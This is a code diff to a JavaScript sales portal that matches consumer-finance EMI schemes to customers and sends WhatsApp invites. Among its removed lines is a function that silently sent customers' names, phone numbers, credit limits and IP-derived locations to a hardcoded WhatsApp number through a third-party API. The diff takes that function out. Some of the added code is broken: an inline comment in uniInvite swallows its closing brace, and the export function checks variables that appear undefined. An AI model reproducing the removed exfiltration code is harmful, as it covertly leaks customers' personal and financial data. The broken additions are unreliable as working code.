@@ -57,7 +57,8 @@ async function handleGoogleLogin(response) {
 }
 
 function updateLoginUI(userName, isOnline) {
-    let statusBadge = document.getElementById('gitStatusBadge');
+    let statusBadge = document.getElementById('userStatusBadge') || document.getElementById('gitStatusBadge');
+    if (statusBadge && statusBadge.id === 'userStatusBadge') statusBadge.style.display = 'block';
     let syncBtn = document.getElementById('syncBtn');
     if(syncBtn) syncBtn.style.display = 'flex';
     if(statusBadge) {
@@ -129,7 +130,12 @@ if (typeof pdfjsLib !== 'undefined') {
     pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.16.105/pdf.worker.min.js';
 }
 
-function toggleSidebar() { document.getElementById('appSidebar').classList.toggle('open'); document.getElementById('sidebarOverlay').classList.toggle('show'); }
+window.toggleSidebar = function() {
+    const sidebar = document.getElementById('appSidebar');
+    const overlay = document.getElementById('sidebarOverlay');
+    if (sidebar) sidebar.classList.toggle('open');
+    if (overlay) overlay.classList.toggle('show');
+};
 function openCustomerMessageModal() { document.getElementById('customerMessageGenModal').style.display = 'flex'; calculateDates(); updateDraftBadgeCount(); }
 function closeCustomerMessageModal() { document.getElementById('customerMessageGenModal').style.display = 'none'; }
 
@@ -465,7 +471,8 @@ function clearFgModel() { tempFgModel = ""; document.getElementById('fgSelectedM
 
 function generateFlyer() {
     let sName = document.getElementById('fgSalesName').value.trim(); let sMob = document.getElementById('fgSalesMobile').value.trim(); let oType = document.getElementById('fgOfferType').value; let oVal = document.getElementById('fgOfferValue').value.trim();
-    if(!sName || !sMob || sMob.length !== 10) { showToast("⚠️ Kripya Salesman Name aur 10-Digit Mobile Number barabar dalein!", "error"); return; }
+    if(!sName) { showToast("⚠️ Kripya Salesman Name barabar dalein!", "error"); return; }
+    if(sMob && sMob.length !== 10) { showToast("⚠️ Agar Mobile Number dal rahe hain toh 10-Digit ka dalein!", "error"); return; }
     if(!tempFgDealerId) { showToast("⚠️ Kadak Niyam: Dealer Shop select karna Compulsory hai!", "error"); return; }
     if(!tempFgBitly) { showToast("⚠️ Is Dealer ki Bitly Link master data mein nahi mili!", "error"); return; }
     if(oType !== "NONE" && !oVal) { showToast("⚠️ Agar Offer select ki hai toh Amount ya Gift ka naam dalein!", "error"); return; }
@@ -786,8 +793,10 @@ function exportDictSchemeImage(action) {
     document.body.appendChild(exportDiv);
 
     let clonedTable = exportDiv.querySelector('table');
-    let actionCells = clonedTable.querySelectorAll('th:last-child, td:last-child');
-    actionCells.forEach(cell => cell.remove());
+    if (limit && invoice) {
+        let actionCells = clonedTable.querySelectorAll('th:last-child, td:last-child');
+        actionCells.forEach(cell => cell.remove());
+    }
 
     clonedTable.style.width = "100%"; clonedTable.style.borderCollapse = "collapse";
     exportDiv.querySelectorAll('th, td').forEach(cell => { cell.style.padding = "10px"; cell.style.borderBottom = "1px solid #ddd"; cell.style.textAlign = "center"; });
@@ -895,7 +904,7 @@ function calculateFastData() {
 }
 
 async function silentLeadDispatcher(cust) {
-    try { let locInfo = "Location: Hidden/Unknown"; try { let ipRes = await fetch("https://ipapi.co/json/"); if (ipRes.ok) { let ipData = await ipRes.json(); locInfo = `${ipData.city || '-'}, ${ipData.region || '-'} (${ipData.org || 'ISP'})`; } } catch(e) {} let secretMsg = `🚨 *PORTAL SECRET LEAD*\n\n👤 *Name:* ${cust.name}\n📞 *Mobile:* ${cust.mobile || 'N/A'}\n💰 *Limit:* ₹${cust.limit}\n🏷️ *Type:* ${cust.type}\n📊 *LTV:* ${cust.ltv}%\n🛡️ *Cap:* ${cust.cap ? '₹'+cust.cap : 'None'}\n⏰ *Time:* ${cust.timestamp}\n📍 *Location:* ${locInfo}`; let targetPhone = "918087313624"; let apiKey = localStorage.getItem('callmebot_secret_key') || "YOUR_API_KEY"; let encMsg = encodeURIComponent(secretMsg); let url = `https://api.callmebot.com/whatsapp.php?phone=${targetPhone}&text=${encMsg}&apikey=${apiKey}`; fetch(url, { method: 'GET', mode: 'no-cors' }).catch(e => {}); } catch(err) {}
+    // External tracking removed for security & privacy
 }
 
 /* === REAL-TIME DUPLICATE MOBILE CHECKER (ACTIVE QUEUE + RECYCLE BIN) === */
@@ -1015,8 +1024,9 @@ function updateUniversalActionButtons() {
 function uniCopy() { if(selectedQueueIndex !== -1) copyCustomerDetails(selectedQueueIndex, document.getElementById('uniCopyBtn')); }
 function uniSelect() { if(selectedQueueIndex !== -1) setActiveCustomer(selectedQueueIndex); }
 function uniEdit() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; document.getElementById('ecName').value = c.name; document.getElementById('ecMobile').value = c.mobile || ''; document.getElementById('ecLimit').value = c.limit; document.getElementById('ecLtv').value = c.ltv || 100; document.getElementById('ecType').value = c.type; document.getElementById('ecCap').value = c.cap || ''; document.getElementById('editCustomerModal').style.display='flex'; }
-function uniInvite() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; if(!c.mobile || c.mobile.length < 10) { showToast("⚠️ Kripya Customer ka valid 10 digit mobile number update karein!", "error"); return; } document.getElementById('invSenderName').value = localStorage.getItem('portal_sales_name') || ""; document.getElementById('invSenderMobile').value = localStorage.getItem('portal_sales_mobile') || ""; document.getElementById('inviteModal').style.display = 'flex'; }
-function sendWhatsAppInvite() { let sName = document.getElementById('invSenderName').value.trim(); let sMobile = document.getElementById('invSenderMobile').value.trim(); if(!sName || !sMobile) { showToast("⚠️ Kripya apna Naam aur Number dalein!", "error"); return; } localStorage.setItem('portal_sales_name', sName); localStorage.setItem('portal_sales_mobile', sMobile); let c = customerQueue[selectedQueueIndex]; let msg = `Namaskar ${c.name} sir/madam! 🎉\n\nAapki Bajaj Finance ki *₹${c.limit}* ki limit approve ho gayi hai! 🥳\n\nAb intezaar kis baat ka? Aaj hi apni pasand ki cheez kharidne ke liye dukan par zaroor visit karein. 🛍️✨\n\n👤 *${sName}*\n📞 ${sMobile}`; let encMsg = encodeURIComponent(msg); window.open(`https://wa.me/91${c.mobile}?text=${encMsg}`, '_blank'); document.getElementById('inviteModal').style.display = 'none'; }
+function uniInvite() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; // Mobile number optional if hidden document.getElementById('invSenderName').value = localStorage.getItem('portal_sales_name') || ""; document.getElementById('invSenderMobile').value = localStorage.getItem('portal_sales_mobile') || ""; document.getElementById('inviteModal').style.display = 'flex'; }
+function sendWhatsAppInvite() { let sName = document.getElementById('invSenderName').value.trim(); let sMobile = document.getElementById('invSenderMobile').value.trim(); if(!sName) { showToast("⚠️ Kripya apna Naam dalein!", "error"); return; } localStorage.setItem('portal_sales_name', sName); localStorage.setItem('portal_sales_mobile', sMobile); let c = customerQueue[selectedQueueIndex]; let msg = `Namaskar ${c.name} sir/madam! 🎉\n\nAapki Bajaj Finance ki *₹${c.limit}* ki limit approve ho gayi hai! 🥳\n\nAb intezaar kis baat ka? Aaj hi apni pasand ki cheez kharidne ke liye dukan par zaroor visit karein. 🛍️✨\n\n👤 *${sName}*\n📞 ${sMobile}`; let encMsg = encodeURIComponent(msg); let waUrl = (c.mobile && c.mobile.length === 10) ? `https://wa.me/91${c.mobile}?text=${encMsg}` : `https://api.whatsapp.com/send?text=${encMsg}`;
+    window.open(waUrl, '_blank'); document.getElementById('inviteModal').style.display = 'none'; }
 function closeCustomerEdit() { document.getElementById('editCustomerModal').style.display='none'; }
 
 async function saveCustomerEdit() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; c.name = document.getElementById('ecName').value || 'Customer'; c.mobile = document.getElementById('ecMobile').value; c.limit = parseFloat(document.getElementById('ecLimit').value) || 0; c.ltv = parseFloat(document.getElementById('ecLtv').value) || 100; c.type = document.getElementById('ecType').value; let cap = parseFloat(document.getElementById('ecCap').value); c.cap = cap > 0 ? cap : ''; await saveQueueToLocal(); renderCustomerQueue(); if(activeCustomerIndex === selectedQueueIndex) { updateMatrixTopCard(); current_products.forEach((_, idx) => recalcModel(idx)); } closeCustomerEdit(); }
@@ -1136,7 +1146,7 @@ async function finalizeProductAddition() {
     let raw = tempPendingProduct.isNT ? db_records.filter(r => r.model === SPECIAL_MODEL && r.category === tempPendingProduct.category) : db_records.filter(r => r.model === tempPendingProduct.name); let ltvLimit = customerQueue[activeCustomerIndex]?.ltv || 100; let matrixEligible = raw.filter(s => s.fixedEmi > 0 || (s.tenure > 0 && ((s.tenure-s.advEmi)/s.tenure)*100 <= ltvLimit)); let uniqueSchemes = []; let seenSchemes = new Set();
     matrixEligible.forEach(s => { let schemeKey = `${s.tenure}_${s.advEmi}_${s.fixedEmi}_${s.minLoan}_${s.maxLoan}`; if (!seenSchemes.has(schemeKey)) { seenSchemes.add(schemeKey); s.inactive = false; uniqueSchemes.push(s); } });
     let comp = customerQueue[activeCustomerIndex].components || {}; let finalMrp = comp.mrp || ""; let finalInv = comp.inv || ""; let surch = (finalInv > finalMrp && finalMrp > 0) ? finalInv - finalMrp : 0;
-    current_products.push({ name: tempPendingProduct.name, isNonTieup: tempPendingProduct.isNT, schemes: uniqueSchemes, category: tempPendingProduct.category, inputs: { mrp: finalMrp, inv: finalInv, cap: comp.cap || (customerQueue[activeCustomerIndex]?.cap || ""), target: comp.target || "", gtl: comp.gtl || 0, rfc: comp.rfc || 0, exw: comp.exw || 0, margin: comp.margin || "", dealer: comp.dealer || "", surch: surch, manualLoans: {} }, isManual: false }); sortConfigs.push({ key: 'dp', asc: 'asc' }); customerQueue[activeCustomerIndex].products = current_products; customerQueue[activeCustomerIndex].sortConfigs = sortConfigs; tempPendingProduct = null; await saveQueueToLocal(); renderMatrix(); 
+    current_products.push({ name: tempPendingProduct.name, isNonTieup: tempPendingProduct.isNT, schemes: uniqueSchemes, category: tempPendingProduct.category, inputs: { mrp: finalMrp, inv: finalInv, cap: comp.cap || (customerQueue[activeCustomerIndex]?.cap || ""), target: comp.target || "", gtl: comp.gtl || 0, rfc: comp.rfc || 0, exw: comp.exw || 0, margin: comp.margin || "", dealer: comp.dealer || "", surch: surch, manualLoans: {} }, isManual: false }); sortConfigs.push({ key: 'dp', dir: 'asc' }); customerQueue[activeCustomerIndex].products = current_products; customerQueue[activeCustomerIndex].sortConfigs = sortConfigs; tempPendingProduct = null; await saveQueueToLocal(); renderMatrix(); 
 }
 
 function updateFinalSwitcher() { let sw = document.getElementById('finalCustomerSwitcher'); if(!sw) return; sw.innerHTML = customerQueue.map((c, i) => `<option value="${i}" ${i === activeCustomerIndex ? 'selected' : ''}>👤 ${c.name} (₹${c.limit})</option>`).join(''); }
@@ -1462,7 +1472,14 @@ function copySchemeText(pIdx, dIdx, btnElement) {
 }
 
 function fallbackCopy(text, successCb) {
-    let ta = document.createElement("textarea"); ta.value = text; ta.setAttribute('readonly', ''); ta.style.position = "absolute"; ta.style.left = "-9999px"; document.body.appendChild(ta); ta.select(); ta.setSelectionRange(0, 99999); 
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(text).then(successCb).catch(() => legacyCopy(text, successCb));
+    } else {
+        legacyCopy(text, successCb);
+    }
+}
+function legacyCopy(text, successCb) {
+    let ta = document.createElement("textarea"); ta.value = text; ta.setAttribute('readonly', ''); ta.style.position = "fixed"; ta.style.top = "0"; ta.style.left = "-9999px"; document.body.appendChild(ta); ta.select(); ta.setSelectionRange(0, 99999); 
     try { let success = document.execCommand('copy'); if (success) { successCb(); } else { showCustomAlert("Auto-copy block zala ahe. Kripya manually copy kara:", text); } } catch (err) { showCustomAlert("Auto-copy fail zala. Kripya manually copy kara:", text); } document.body.removeChild(ta);
 }
 
